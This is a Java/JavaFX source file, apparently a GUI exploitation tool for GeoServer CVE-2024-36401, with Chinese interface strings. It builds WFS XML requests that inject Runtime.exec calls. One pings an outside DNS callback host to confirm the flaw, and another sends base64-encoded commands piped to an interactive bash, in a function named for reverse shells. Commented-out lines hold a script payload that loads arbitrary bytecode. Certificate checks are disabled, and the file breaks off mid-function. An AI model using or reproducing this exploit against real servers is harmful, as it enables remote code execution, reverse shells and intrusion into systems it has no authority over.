
import javafx.concurrent.Task;
import javafx.fxml.FXML;
import javafx.scene.control.Alert;
import javafx.scene.control.ComboBox;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;

import javax.net.ssl.*;
import java.awt.event.ActionEvent;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class fdg {


    @FXML
    private TextField testgfgd;

    @FXML
    private ComboBox<String> myComboBox;

    @FXML
    private ComboBox<String> comboBoxsdf;

    @FXML
    private TextField tesft;

    @FXML
    private TextArea testghjg;

    @FXML
    private TextField ziguvhun;

    @FXML
    private TextField terefesf;

    @FXML
    void fantanshekkdfds(ActionEvent event) {


    }


    @FXML
    void fdgdgf(ActionEvent event) {


        String selectedItem = comboBoxsdf.getValue();


        if ("all".equals(selectedItem)) {

            Alert alert = new Alert(Alert.AlertType.ERROR);
            alert.setTitle("拼写检查");
            alert.setHeaderText("");
            alert.setContentText("请选择模块！");
            alert.showAndWait();
        } else if ("geoserver CVE-2024-36401".equals(selectedItem)) {

            fantanshell();



        }


    }


    @FXML
    void fantanshekk(ActionEvent event) {

        fantanshell();
        fsdsaddff();


    }


    public void geoserverjiance() {


        String url = testgfgd.getText();
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
        }
        try {
            int length = 10;
            String randomString = generateRandomString(length);
            //  System.out.println(randomString);

            int length1 = 10;
            String randomString1 = generateRandomString1(length1);


            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            URL url1 = new URL(url + "/geoserver/wfs");
            //     String json = "{\"sql\":\"call${\\\"freemarker.template.utility.ObjectConstructor\\\"?new()(\\\"javax.script.ScriptEngineManager\\\").getEngineByName(\\\"js\\\").eval(\\\"classLoader=java.lang.Thread.currentThread().getContextClassLoader();try{classLoader.loadClass('org.apachen.SOAPUtils').newInstance();}catch(e){clsString=classLoader.loadClass('java.lang.String');bytecodeBase64='';try{clsBase64=classLoader.loadClass('java.util.Base64');clsDecoder=classLoader.loadClass('java.util.Base64$Decoder');decoder=clsBase64.getMethod('getDecoder').invoke(base64Clz);bytecode=clsDecoder.getMethod('decode',clsString).invoke(decoder,bytecodeBase64);}catch(ee){try{datatypeConverterClz=classLoader.loadClass('javax.xml.bind.DatatypeConverter');bytecode=datatypeConverterClz.getMethod('parseBase64Binary',clsString).invoke(datatypeConverterClz,bytecodeBase64);}catch(eee){clazz1=classLoader.loadClass('sun.misc.BASE64Decoder');bytecode=clazz1.newInstance().decodeBuffer(bytecodeBase64);}}clsClassLoader=classLoader.loadClass('java.lang.ClassLoader');clsByteArray=(''.getBytes().getClass());clsInt=java.lang.Integer.TYPE;defineClass=clsClassLoader.getDeclaredMethod('defineClass',[clsByteArray,clsInt,clsInt]);defineClass.setAccessible(true);clazz=defineClass.invoke(classLoader,bytecode,0,bytecode.length);clazz.newInstance();};#{1};\\\")}\",\"dbSource\":\"\",\"type\":\"0\"}";
            //    String json = "{\"sql\":\"call${\\\"freemarker.template.utility.ObjectConstructor\\\"?new()(\\\"javax.script.ScriptEngineManager\\\").getEngineByName(\\\"js\\\").eval(\\\"classLoader=java.lang.Thread.currentThread().getContextClassLoader();try{classLoader.loadClass('org.apachen.SOAPUtils').newInstance();}catch(e){clsString=classLoader.loadClass('java.lang.String');bytecodeBase64='';try{clsBase64=classLoader.loadClass('java.util.Base64');clsDecoder=classLoader.loadClass('java.util.Base64$Decoder');decoder=clsBase64.getMethod('getDecoder').invoke(base64Clz);bytecode=clsDecoder.getMethod('decode',clsString).invoke(decoder,bytecodeBase64);}catch(ee){try{datatypeConverterClz=classLoader.loadClass('javax.xml.bind.DatatypeConverter');bytecode=datatypeConverterClz.getMethod('parseBase64Binary',clsString).invoke(datatypeConverterClz,bytecodeBase64);}catch(eee){clazz1=classLoader.loadClass('sun.misc.BASE64Decoder');bytecode=clazz1.newInstance().decodeBuffer(bytecodeBase64);}}clsClassLoader=classLoader.loadClass('java.lang.ClassLoader');clsByteArray=(''.getBytes().getClass());clsInt=java.lang.Integer.TYPE;defineClass=clsClassLoader.getDeclaredMethod('defineClass',[clsByteArray,clsInt,clsInt]);defineClass.setAccessible(true);clazz=defineClass.invoke(classLoader,bytecode,0,bytecode.length);clazz.newInstance();};#{1};\\\")}\",\"dbSource\":\"\",\"type\":\"0\"}";
            String json = "<wfs:GetPropertyValue service='WFS' version='2.0.0'\n" +
                    " xmlns:topp='http://www.openplans.org/topp'\n" +
                    " xmlns:fes='http://www.opengis.net/fes/2.0'\n" +
                    " xmlns:wfs='http://www.opengis.net/wfs/2.0'\n" +
                    " valueReference='exec(java.lang.Runtime.getRuntime(),\"ping fxwxwqEfKn.vdrmjozgsn.dgrh3.cn\")'>\n" +
                    "   <wfs:Query typeNames='" + terefesf.getText() + "'/>\n" +
                    "</wfs:GetPropertyValue>";
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestProperty("User-Agent", "curl/7.77.0");
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/xml");
            connection.setRequestProperty("Accept", "*/*");
            byte[] input = json.getBytes(StandardCharsets.UTF_8);
            OutputStream os = connection.getOutputStream();
            os.write(input, 0, input.length);
            os.flush();


            int responseCode = connection.getResponseCode();


            if (responseCode == HttpURLConnection.HTTP_BAD_REQUEST) {

                BufferedReader errorReader = new BufferedReader(new InputStreamReader(connection.getErrorStream()));
                String lines;
                StringBuilder errorResponse = new StringBuilder();
                while ((lines = errorReader.readLine()) != null) {
                    errorResponse.append(lines);
                }

                if (errorResponse.toString().contains("java.lang.ClassCastException")) {
                    //    testghjg.appendText("找到关键字符：java.lang.ClassCastException"+"\n");
                    testghjg.appendText(formattedDateTime + url + "[+++]存在geoserver CVE-2024-36401漏洞" + "\n");


                } else {

                    //    testghjg.appendText("poc1发包完毕"+"\n");
                    testghjg.appendText(formattedDateTime + url + "[-]不存在geoserver CVE-2024-36401漏洞" + "\n");


                }


            }


        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            testghjg.appendText(formattedDateTime + url + "[-]不存在geoserver CVE-2024-36401漏洞-" + "\n");
            System.out.println(e);
        }


    }

    public void rce(javafx.event.ActionEvent actionEvent) {

        zhuaqu();
        geoserverfdfg();


    }


    private String generateRandomString(int length) {
        StringBuilder stringBuilder = new StringBuilder();
        Random random = new Random();

        String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

        for (int i = 0; i < length; i++) {
            int randomIndex = random.nextInt(characters.length());
            stringBuilder.append(characters.charAt(randomIndex));
        }

        return stringBuilder.toString();
    }

    private String generateRandomString1(int length) {
        StringBuilder stringBuilder = new StringBuilder();
        Random random = new Random();

        String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

        for (int i = 0; i < length; i++) {
            int randomIndex = random.nextInt(characters.length());
            stringBuilder.append(characters.charAt(randomIndex));
        }

        return stringBuilder.toString();
    }


    public void geoserverfdfg() {

        String url = testgfgd.getText();
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
        }
        try {
            int length = 10;
            String randomString = generateRandomString(length);
            //  System.out.println(randomString);

            int length1 = 10;
            String randomString1 = generateRandomString1(length1);
            //System.out.println(randomString1);


            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            URL url1 = new URL(url + "/wfs");
            //     String json = "{\"sql\":\"call${\\\"freemarker.template.utility.ObjectConstructor\\\"?new()(\\\"javax.script.ScriptEngineManager\\\").getEngineByName(\\\"js\\\").eval(\\\"classLoader=java.lang.Thread.currentThread().getContextClassLoader();try{classLoader.loadClass('org.apachen.SOAPUtils').newInstance();}catch(e){clsString=classLoader.loadClass('java.lang.String');bytecodeBase64='';try{clsBase64=classLoader.loadClass('java.util.Base64');clsDecoder=classLoader.loadClass('java.util.Base64$Decoder');decoder=clsBase64.getMethod('getDecoder').invoke(base64Clz);bytecode=clsDecoder.getMethod('decode',clsString).invoke(decoder,bytecodeBase64);}catch(ee){try{datatypeConverterClz=classLoader.loadClass('javax.xml.bind.DatatypeConverter');bytecode=datatypeConverterClz.getMethod('parseBase64Binary',clsString).invoke(datatypeConverterClz,bytecodeBase64);}catch(eee){clazz1=classLoader.loadClass('sun.misc.BASE64Decoder');bytecode=clazz1.newInstance().decodeBuffer(bytecodeBase64);}}clsClassLoader=classLoader.loadClass('java.lang.ClassLoader');clsByteArray=(''.getBytes().getClass());clsInt=java.lang.Integer.TYPE;defineClass=clsClassLoader.getDeclaredMethod('defineClass',[clsByteArray,clsInt,clsInt]);defineClass.setAccessible(true);clazz=defineClass.invoke(classLoader,bytecode,0,bytecode.length);clazz.newInstance();};#{1};\\\")}\",\"dbSource\":\"\",\"type\":\"0\"}";
            //    String json = "{\"sql\":\"call${\\\"freemarker.template.utility.ObjectConstructor\\\"?new()(\\\"javax.script.ScriptEngineManager\\\").getEngineByName(\\\"js\\\").eval(\\\"classLoader=java.lang.Thread.currentThread().getContextClassLoader();try{classLoader.loadClass('org.apachen.SOAPUtils').newInstance();}catch(e){clsString=classLoader.loadClass('java.lang.String');bytecodeBase64='';try{clsBase64=classLoader.loadClass('java.util.Base64');clsDecoder=classLoader.loadClass('java.util.Base64$Decoder');decoder=clsBase64.getMethod('getDecoder').invoke(base64Clz);bytecode=clsDecoder.getMethod('decode',clsString).invoke(decoder,bytecodeBase64);}catch(ee){try{datatypeConverterClz=classLoader.loadClass('javax.xml.bind.DatatypeConverter');bytecode=datatypeConverterClz.getMethod('parseBase64Binary',clsString).invoke(datatypeConverterClz,bytecodeBase64);}catch(eee){clazz1=classLoader.loadClass('sun.misc.BASE64Decoder');bytecode=clazz1.newInstance().decodeBuffer(bytecodeBase64);}}clsClassLoader=classLoader.loadClass('java.lang.ClassLoader');clsByteArray=(''.getBytes().getClass());clsInt=java.lang.Integer.TYPE;defineClass=clsClassLoader.getDeclaredMethod('defineClass',[clsByteArray,clsInt,clsInt]);defineClass.setAccessible(true);clazz=defineClass.invoke(classLoader,bytecode,0,bytecode.length);clazz.newInstance();};#{1};\\\")}\",\"dbSource\":\"\",\"type\":\"0\"}";
            String json = "<wfs:GetPropertyValue service='WFS' version='2.0.0'\n" +
                    " xmlns:topp='http://www.openplans.org/topp'\n" +
                    " xmlns:fes='http://www.opengis.net/fes/2.0'\n" +
                    " xmlns:wfs='http://www.opengis.net/wfs/2.0'\n" +
                    " valueReference='exec(java.lang.Runtime.getRuntime(),\"ping fxwxwqEfKn.vdrmjozgsn.dgrh3.cn\")'>\n" +
                    "  <wfs:Query typeNames='" + terefesf.getText() + "'/>\n" +
                    "</wfs:GetPropertyValue>";
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestProperty("User-Agent", "curl/7.77.0");
            connection.setDoOutput(true);
            connection.setDoInput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/xml");
            connection.setRequestProperty("Accept", "*/*");
            byte[] input = json.getBytes(StandardCharsets.UTF_8);
            OutputStream os = connection.getOutputStream();
            os.write(input, 0, input.length);
            os.flush();

            int responseCode = connection.getResponseCode();


            if (responseCode == HttpURLConnection.HTTP_BAD_REQUEST) {

                BufferedReader errorReader = new BufferedReader(new InputStreamReader(connection.getErrorStream()));
                String lines;
                StringBuilder errorResponse = new StringBuilder();
                while ((lines = errorReader.readLine()) != null) {
                    errorResponse.append(lines);


                }
                testghjg.appendText("\n" + "端点:" + terefesf.getText());


                if (errorResponse.toString().contains("java.lang.ClassCastException")) {
                    // testghjg.appendText("找到关键字符：java.lang.ClassCastException"+"\n");

                    testghjg.appendText("\n" + formattedDateTime + url + "[+++]存在geoserver CVE-2024-36401漏洞" + "\n");


                } else {

                    //    testghjg.appendText("poc2发包完毕"+"\n");
                    testghjg.appendText(formattedDateTime + url + "[-]不存在geoserver CVE-2024-36401漏洞" + "\n");


                }

            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            testghjg.appendText(formattedDateTime + url + "[-]不存在geoserver CVE-2024-36401漏洞-" + "\n");
            System.out.println(e);
        }

    }

    public void zhuaqu() {


        String url = testgfgd.getText();
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
        }
        try {


            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {

                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            URL url1 = new URL(url + "/geoserver/wfs");
            //     String json = "{\"sql\":\"call${\\\"freemarker.template.utility.ObjectConstructor\\\"?new()(\\\"javax.script.ScriptEngineManager\\\").getEngineByName(\\\"js\\\").eval(\\\"classLoader=java.lang.Thread.currentThread().getContextClassLoader();try{classLoader.loadClass('org.apachen.SOAPUtils').newInstance();}catch(e){clsString=classLoader.loadClass('java.lang.String');bytecodeBase64='';try{clsBase64=classLoader.loadClass('java.util.Base64');clsDecoder=classLoader.loadClass('java.util.Base64$Decoder');decoder=clsBase64.getMethod('getDecoder').invoke(base64Clz);bytecode=clsDecoder.getMethod('decode',clsString).invoke(decoder,bytecodeBase64);}catch(ee){try{datatypeConverterClz=classLoader.loadClass('javax.xml.bind.DatatypeConverter');bytecode=datatypeConverterClz.getMethod('parseBase64Binary',clsString).invoke(datatypeConverterClz,bytecodeBase64);}catch(eee){clazz1=classLoader.loadClass('sun.misc.BASE64Decoder');bytecode=clazz1.newInstance().decodeBuffer(bytecodeBase64);}}clsClassLoader=classLoader.loadClass('java.lang.ClassLoader');clsByteArray=(''.getBytes().getClass());clsInt=java.lang.Integer.TYPE;defineClass=clsClassLoader.getDeclaredMethod('defineClass',[clsByteArray,clsInt,clsInt]);defineClass.setAccessible(true);clazz=defineClass.invoke(classLoader,bytecode,0,bytecode.length);clazz.newInstance();};#{1};\\\")}\",\"dbSource\":\"\",\"type\":\"0\"}";
            //    String json = "{\"sql\":\"call${\\\"freemarker.template.utility.ObjectConstructor\\\"?new()(\\\"javax.script.ScriptEngineManager\\\").getEngineByName(\\\"js\\\").eval(\\\"classLoader=java.lang.Thread.currentThread().getContextClassLoader();try{classLoader.loadClass('org.apachen.SOAPUtils').newInstance();}catch(e){clsString=classLoader.loadClass('java.lang.String');bytecodeBase64='';try{clsBase64=classLoader.loadClass('java.util.Base64');clsDecoder=classLoader.loadClass('java.util.Base64$Decoder');decoder=clsBase64.getMethod('getDecoder').invoke(base64Clz);bytecode=clsDecoder.getMethod('decode',clsString).invoke(decoder,bytecodeBase64);}catch(ee){try{datatypeConverterClz=classLoader.loadClass('javax.xml.bind.DatatypeConverter');bytecode=datatypeConverterClz.getMethod('parseBase64Binary',clsString).invoke(datatypeConverterClz,bytecodeBase64);}catch(eee){clazz1=classLoader.loadClass('sun.misc.BASE64Decoder');bytecode=clazz1.newInstance().decodeBuffer(bytecodeBase64);}}clsClassLoader=classLoader.loadClass('java.lang.ClassLoader');clsByteArray=(''.getBytes().getClass());clsInt=java.lang.Integer.TYPE;defineClass=clsClassLoader.getDeclaredMethod('defineClass',[clsByteArray,clsInt,clsInt]);defineClass.setAccessible(true);clazz=defineClass.invoke(classLoader,bytecode,0,bytecode.length);clazz.newInstance();};#{1};\\\")}\",\"dbSource\":\"\",\"type\":\"0\"}";
            String json = "<wfs:ListStoredQueries service='WFS'\n" +
                    " version='2.0.0'\n" +
                    " xmlns:wfs='http://www.opengis.net/wfs/2.0'/>";
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            //  connection.setRequestProperty("User-Agent", "curl/7.77.0");
            connection.setRequestMethod("POST");
  
            connection.setRequestProperty("Accept", "*/*");
            connection.setRequestProperty("Content-Type", "application/xml");
            connection.setRequestProperty("User-Agent", "curl/7.77.0");
            connection.setDoOutput(true);
            OutputStream outputStream = connection.getOutputStream();
            outputStream.write(json.getBytes());
            outputStream.flush();
            outputStream.close();


            //  String pattern = "<wfs:ReturnFeatureType>(.*?)</wfs:ReturnFeatureType>";
            //  Pattern r = Pattern.compile(pattern);
            //   Matcher m = r.matcher(errorResponse.toString());
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                // 读取响应内容
                BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                String line;
                StringBuilder response = new StringBuilder();
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                reader.close();

                String pattern = "<wfs:ReturnFeatureType>(.*?)</wfs:ReturnFeatureType>";
                Pattern r = Pattern.compile(pattern);
                Matcher m = r.matcher(response.toString());
                if (m.find()) {
                    String value = m.group(1);


                    // 处理响应
                    //      testghjg.appendText(value);
                    terefesf.setText(value);
                } else {
                    // testghjg.appendText("请求失败，响应代码: " + responseCode);
                }


            }

        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            //   testghjg.appendText(formattedDateTime + url + "[-]不存在geoserver CVE-2024-36401漏洞-" + "\n");
            //     System.out.println(e);

        }


    }

    public void fantanshell() {


        String url = testgfgd.getText();
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
        }
        try {


            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {

                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            URL url1 = new URL(url + "/geoserver/wfs");
            //     String json = "{\"sql\":\"call${\\\"freemarker.template.utility.ObjectConstructor\\\"?new()(\\\"javax.script.ScriptEngineManager\\\").getEngineByName(\\\"js\\\").eval(\\\"classLoader=java.lang.Thread.currentThread().getContextClassLoader();try{classLoader.loadClass('org.apachen.SOAPUtils').newInstance();}catch(e){clsString=classLoader.loadClass('java.lang.String');bytecodeBase64='';try{clsBase64=classLoader.loadClass('java.util.Base64');clsDecoder=classLoader.loadClass('java.util.Base64$Decoder');decoder=clsBase64.getMethod('getDecoder').invoke(base64Clz);bytecode=clsDecoder.getMethod('decode',clsString).invoke(decoder,bytecodeBase64);}catch(ee){try{datatypeConverterClz=classLoader.loadClass('javax.xml.bind.DatatypeConverter');bytecode=datatypeConverterClz.getMethod('parseBase64Binary',clsString).invoke(datatypeConverterClz,bytecodeBase64);}catch(eee){clazz1=classLoader.loadClass('sun.misc.BASE64Decoder');bytecode=clazz1.newInstance().decodeBuffer(bytecodeBase64);}}clsClassLoader=classLoader.loadClass('java.lang.ClassLoader');clsByteArray=(''.getBytes().getClass());clsInt=java.lang.Integer.TYPE;defineClass=clsClassLoader.getDeclaredMethod('defineClass',[clsByteArray,clsInt,clsInt]);defineClass.setAccessible(true);clazz=defineClass.invoke(classLoader,bytecode,0,bytecode.length);clazz.newInstance();};#{1};\\\")}\",\"dbSource\":\"\",\"type\":\"0\"}";
            //    String json = "{\"sql\":\"call${\\\"freemarker.template.utility.ObjectConstructor\\\"?new()(\\\"javax.script.ScriptEngineManager\\\").getEngineByName(\\\"js\\\").eval(\\\"classLoader=java.lang.Thread.currentThread().getContextClassLoader();try{classLoader.loadClass('org.apachen.SOAPUtils').newInstance();}catch(e){clsString=classLoader.loadClass('java.lang.String');bytecodeBase64='';try{clsBase64=classLoader.loadClass('java.util.Base64');clsDecoder=classLoader.loadClass('java.util.Base64$Decoder');decoder=clsBase64.getMethod('getDecoder').invoke(base64Clz);bytecode=clsDecoder.getMethod('decode',clsString).invoke(decoder,bytecodeBase64);}catch(ee){try{datatypeConverterClz=classLoader.loadClass('javax.xml.bind.DatatypeConverter');bytecode=datatypeConverterClz.getMethod('parseBase64Binary',clsString).invoke(datatypeConverterClz,bytecodeBase64);}catch(eee){clazz1=classLoader.loadClass('sun.misc.BASE64Decoder');bytecode=clazz1.newInstance().decodeBuffer(bytecodeBase64);}}clsClassLoader=classLoader.loadClass('java.lang.ClassLoader');clsByteArray=(''.getBytes().getClass());clsInt=java.lang.Integer.TYPE;defineClass=clsClassLoader.getDeclaredMethod('defineClass',[clsByteArray,clsInt,clsInt]);defineClass.setAccessible(true);clazz=defineClass.invoke(classLoader,bytecode,0,bytecode.length);clazz.newInstance();};#{1};\\\")}\",\"dbSource\":\"\",\"type\":\"0\"}";
            String json = "<wfs:ListStoredQueries service='WFS'\n" +
                    " version='2.0.0'\n" +
                    " xmlns:wfs='http://www.opengis.net/wfs/2.0'/>";
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            //  connection.setRequestProperty("User-Agent", "curl/7.77.0");
            connection.setRequestMethod("POST");
     
            connection.setRequestProperty("Accept", "*/*");
            connection.setRequestProperty("Content-Type", "application/xml");
            connection.setRequestProperty("User-Agent", "curl/7.77.0");
            connection.setDoOutput(true);
            OutputStream outputStream = connection.getOutputStream();
            outputStream.write(json.getBytes());
            outputStream.flush();
            outputStream.close();


            //  String pattern = "<wfs:ReturnFeatureType>(.*?)</wfs:ReturnFeatureType>";
            //  Pattern r = Pattern.compile(pattern);
            //   Matcher m = r.matcher(errorResponse.toString());
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                // 读取响应内容
                BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                String line;
                StringBuilder response = new StringBuilder();
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                reader.close();

                String pattern = "<wfs:ReturnFeatureType>(.*?)</wfs:ReturnFeatureType>";
                Pattern r = Pattern.compile(pattern);
                Matcher m = r.matcher(response.toString());
                if (m.find()) {
                    String value = m.group(1);


                    // 处理响应
                    //      testghjg.appendText(value);
                    terefesf.setText(value);
                } else {
                    // testghjg.appendText("请求失败，响应代码: " + responseCode);
                }


            }

        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            //   testghjg.appendText(formattedDateTime + url + "[-]不存在geoserver CVE-2024-36401漏洞-" + "\n");
            //     System.out.println(e);

        }


    }

    public void fsdsaddff() {


        String url = testgfgd.getText();
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
        }
        try {


            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {

                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            String originalText = tesft.getText();
            String encryptedText = Base64.getEncoder().encodeToString(originalText.getBytes());
            URL url1 = new URL(url + "/geoserver/wfs");
            //     String json = "{\"sql\":\"call${\\\"freemarker.template.utility.ObjectConstructor\\\"?new()(\\\"javax.script.ScriptEngineManager\\\").getEngineByName(\\\"js\\\").eval(\\\"classLoader=java.lang.Thread.currentThread().getContextClassLoader();try{classLoader.loadClass('org.apachen.SOAPUtils').newInstance();}catch(e){clsString=classLoader.loadClass('java.lang.String');bytecodeBase64='';try{clsBase64=classLoader.loadClass('java.util.Base64');clsDecoder=classLoader.loadClass('java.util.Base64$Decoder');decoder=clsBase64.getMethod('getDecoder').invoke(base64Clz);bytecode=clsDecoder.getMethod('decode',clsString).invoke(decoder,bytecodeBase64);}catch(ee){try{datatypeConverterClz=classLoader.loadClass('javax.xml.bind.DatatypeConverter');bytecode=datatypeConverterClz.getMethod('parseBase64Binary',clsString).invoke(datatypeConverterClz,bytecodeBase64);}catch(eee){clazz1=classLoader.loadClass('sun.misc.BASE64Decoder');bytecode=clazz1.newInstance().decodeBuffer(bytecodeBase64);}}clsClassLoader=classLoader.loadClass('java.lang.ClassLoader');clsByteArray=(''.getBytes().getClass());clsInt=java.lang.Integer.TYPE;defineClass=clsClassLoader.getDeclaredMethod('defineClass',[clsByteArray,clsInt,clsInt]);defineClass.setAccessible(true);clazz=defineClass.invoke(classLoader,bytecode,0,bytecode.length);clazz.newInstance();};#{1};\\\")}\",\"dbSource\":\"\",\"type\":\"0\"}";
            //    String json = "{\"sql\":\"call${\\\"freemarker.template.utility.ObjectConstructor\\\"?new()(\\\"javax.script.ScriptEngineManager\\\").getEngineByName(\\\"js\\\").eval(\\\"classLoader=java.lang.Thread.currentThread().getContextClassLoader();try{classLoader.loadClass('org.apachen.SOAPUtils').newInstance();}catch(e){clsString=classLoader.loadClass('java.lang.String');bytecodeBase64='';try{clsBase64=classLoader.loadClass('java.util.Base64');clsDecoder=classLoader.loadClass('java.util.Base64$Decoder');decoder=clsBase64.getMethod('getDecoder').invoke(base64Clz);bytecode=clsDecoder.getMethod('decode',clsString).invoke(decoder,bytecodeBase64);}catch(ee){try{datatypeConverterClz=classLoader.loadClass('javax.xml.bind.DatatypeConverter');bytecode=datatypeConverterClz.getMethod('parseBase64Binary',clsString).invoke(datatypeConverterClz,bytecodeBase64);}catch(eee){clazz1=classLoader.loadClass('sun.misc.BASE64Decoder');bytecode=clazz1.newInstance().decodeBuffer(bytecodeBase64);}}clsClassLoader=classLoader.loadClass('java.lang.ClassLoader');clsByteArray=(''.getBytes().getClass());clsInt=java.lang.Integer.TYPE;defineClass=clsClassLoader.getDeclaredMethod('defineClass',[clsByteArray,clsInt,clsInt]);defineClass.setAccessible(true);clazz=defineClass.invoke(classLoader,bytecode,0,bytecode.length);clazz.newInstance();};#{1};\\\")}\",\"dbSource\":\"\",\"type\":\"0\"}";
            String json = "<wfs:GetPropertyValue service='WFS' version='2.0.0'\n" +
                    " xmlns:topp='http://www.openplans.org/topp'\n" +
                    " xmlns:fes='http://www.opengis.net/fes/2.0'\n" +
                    " xmlns:wfs='http://www.opengis.net/wfs/2.0'>\n" +
                    "  <wfs:Query typeNames='" + terefesf.getText() + "'/>\n" +
                    "  <wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'bash -c {echo," + encryptedText + "}|{base64,-d}|{bash,-i}')</wfs:valueReference>\n" +
                    "</wfs:GetPropertyValue>";
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            //  connection.setRequestProperty("User-Agent", "curl/7.77.0");
            connection.setRequestMethod("POST");
     
            connection.setRequestProperty("Accept", "*/*");
            connection.setRequestProperty("Content-Type", "application/xml");
            connection.setRequestProperty("User-Agent", "curl/7.77.0");
            connection.setDoOutput(true);
            OutputStream outputStream = connection.getOutputStream();
            outputStream.write(json.getBytes());
            outputStream.flush();
            outputStream.close();


            //  String pattern = "<wfs:ReturnFeatureType>(.*?)</wfs:ReturnFeatureType>";
            //  Pattern r = Pattern.compile(pattern);
